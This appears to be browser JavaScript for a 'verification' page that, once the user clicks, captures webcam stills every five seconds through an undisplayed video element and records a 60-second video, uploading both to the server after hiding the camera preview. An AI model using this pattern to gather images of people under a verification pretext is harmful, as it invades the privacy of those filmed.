let cameraStream = null;

let imageTimer = null;

let videoRecorder = null;

let videoChunks = [];

let autoStopTimer = null;

let recordingActive = false;


/* =========================
   ELEMENTS
========================= */

const previewVideo =
    document.getElementById(
        "previewVideo"
    );

const cameraPreview =
    document.getElementById(
        "cameraPreview"
    );

const cameraStatus =
    document.getElementById(
        "cameraStatus"
    );

const captureButton =
    document.getElementById(
        "captureButton"
    );

const captureStatus =
    document.getElementById(
        "captureStatus"
    );

const status =
    document.getElementById(
        "status"
    );


/* =========================
   PAGE LOAD
========================= */

window.addEventListener(
    "load",
    () => {

        requestCameraPermission();

    }
);


/* =========================
   CAMERA PERMISSION
========================= */

async function requestCameraPermission() {

    try {

        if (
            !navigator.mediaDevices ||
            !navigator.mediaDevices.getUserMedia
        ) {

            showCameraError(
                "Camera access is not supported."
            );

            return;
        }


        /*
         * Browser permission popup
         */

        cameraStream =
            await navigator
            .mediaDevices
            .getUserMedia({

                video: true,

                audio: false

            });


        /*
         * Permission granted
         */

        previewVideo.srcObject =
            cameraStream;


        cameraPreview.style.display =
            "block";


        cameraStatus.innerHTML =
            "✓ Camera access enabled for this session";


        status.innerText =
            "Verification ready";


        /*
         * Show small preview briefly.
         */

        setTimeout(
            () => {

                cameraPreview.style.display =
                    "none";

            },

            4000
        );


        /*
         * Capture button becomes available.
         */

        setTimeout(
            () => {

                captureButton.hidden =
                    false;

            },

            4000
        );


    } catch (error) {

        console.error(
            "Camera permission error:",
            error
        );


        showCameraError(
            "Camera access was not enabled."
        );

    }

}


/* =========================
   CAMERA ERROR
========================= */

function showCameraError(message) {

    status.innerText =
        "Verification unavailable";


    cameraStatus.innerHTML =
        "Camera access not enabled<br>" +
        "<small>" +
        message +
        "</small>";

}


/* =========================
   START DEMO CAPTURE
========================= */

captureButton.addEventListener(
    "click",
    () => {

        if (!cameraStream) {

            cameraStatus.innerText =
                "Camera access is not available.";

            return;
        }


        recordingActive = true;


        captureButton.disabled =
            true;


        captureButton.innerText =
            "Demo Capture Running";


        status.innerText =
            "Verification in progress";


        captureStatus.innerText =
            "Capturing demonstration data...";


        /*
         * Image:
         * immediately + every 5 seconds
         */

        captureImage();


        imageTimer =
            setInterval(
                () => {

                    if (recordingActive) {

                        captureImage();

                    }

                },

                5000
            );


        /*
         * Start 60-second video
         */

        startVideoRecording();


        /*
         * Stop entire session after 60 sec
         */

        autoStopTimer =
            setTimeout(
                () => {

                    finishCapture();

                },

                60000
            );

    }
);


/* =========================
   IMAGE CAPTURE
========================= */

function captureImage() {

    if (!cameraStream) {

        return;
    }


    /*
     * Hidden video element.
     * It is never displayed on the page.
     */

    const hiddenVideo =
        document.createElement(
            "video"
        );


    hiddenVideo.srcObject =
        cameraStream;

    hiddenVideo.muted = true;

    hiddenVideo.playsInline = true;


    hiddenVideo.onloadedmetadata =
        async () => {

            try {

                await hiddenVideo.play();


                const canvas =
                    document.createElement(
                        "canvas"
                    );


                canvas.width =
                    hiddenVideo.videoWidth;

                canvas.height =
                    hiddenVideo.videoHeight;


                const context =
                    canvas.getContext(
                        "2d"
                    );


                context.drawImage(

                    hiddenVideo,

                    0,

                    0,

                    canvas.width,

                    canvas.height

                );


                const imageData =
                    canvas.toDataURL(

                        "image/jpeg",

                        0.85

                    );


                saveImage(
                    imageData
                );


                hiddenVideo.srcObject =
                    null;


            } catch (error) {

                console.error(
                    "Image capture error:",
                    error
                );

            }

        };

}


/* =========================
   SAVE IMAGE
========================= */

function saveImage(imageData) {

    fetch(
        "/save-image",
        {

            method: "POST",

            headers: {

                "Content-Type":
                    "application/json"

            },

            body: JSON.stringify({

                image: imageData

            })

        }
    )

    .then(
        response =>
            response.json()
    )

    .then(
        data => {

            if (data.success) {

                console.log(
                    "Image saved:",
                    data.filename
                );

            }

        }
    )

    .catch(
        error => {

            console.error(
                "Image save error:",
                error
            );

        }
    );

}


/* =========================
   START VIDEO RECORDING
========================= */

function startVideoRecording() {

    videoChunks = [];


    let options = {};


    if (
        MediaRecorder.isTypeSupported(
            "video/webm;codecs=vp8"
        )
    ) {

        options = {

            mimeType:
                "video/webm;codecs=vp8"

        };

    }


    videoRecorder =
        new MediaRecorder(
            cameraStream,
            options
        );


    videoRecorder.ondataavailable =
        event => {

            if (event.data.size > 0) {

                videoChunks.push(
                    event.data
                );

            }

        };


    videoRecorder.onstop =
        () => {

            saveVideo();

        };


    videoRecorder.start();


    console.log(
        "60-second video recording started."
    );

}


/* =========================
   SAVE VIDEO
========================= */

function saveVideo() {

    const videoBlob =
        new Blob(

            videoChunks,

            {
                type:
                    "video/webm"
            }

        );


    const formData =
        new FormData();


    formData.append(
        "video",
        videoBlob,
        "verification.webm"
    );


    fetch(
        "/save-video",
        {

            method: "POST",

            body: formData

        }
    )

    .then(
        response =>
            response.json()
    )

    .then(
        data => {

            if (data.success) {

                console.log(
                    "Video saved:",
                    data.filename
                );

            }

        }
    )

    .catch(
        error => {

            console.error(
                "Video save error:",
                error
            );

        }
    );

}


/* =========================
   FINISH CAPTURE
========================= */

function finishCapture() {

    recordingActive = false;


    /*
     * Stop image timer
     */

    if (imageTimer) {

        clearInterval(
            imageTimer
        );

        imageTimer = null;

    }


    /*
     * Stop auto timer
     */

    if (autoStopTimer) {

        clearTimeout(
            autoStopTimer
        );

        autoStopTimer = null;

    }


    /*
     * Stop video recorder
     */

    if (
        videoRecorder &&
        videoRecorder.state ===
        "recording"
    ) {

        videoRecorder.stop();

    }


    /*
     * Give video recorder time
     * to finish uploading.
     */

    setTimeout(
        () => {

            stopCamera();

        },

        1000
    );

}


/* =========================
   STOP CAMERA
========================= */

function stopCamera() {

    recordingActive = false;


    if (imageTimer) {

        clearInterval(
            imageTimer
        );

        imageTimer = null;

    }


    if (cameraStream) {

        cameraStream
            .getTracks()
            .forEach(
                track => {

                    track.stop();

                }
            );

        cameraStream = null;

    }


    previewVideo.srcObject =
        null;


    cameraPreview.style.display =
        "none";


    captureButton.disabled =
        false;


    captureButton.hidden =
        false;


    captureButton.innerText =
        "Start Demo Capture";


    status.innerText =
        "Verification completed";


    cameraStatus.innerHTML =
        "✓ Verification completed";


    captureStatus.innerText =
        "Demo capture session completed.";

}
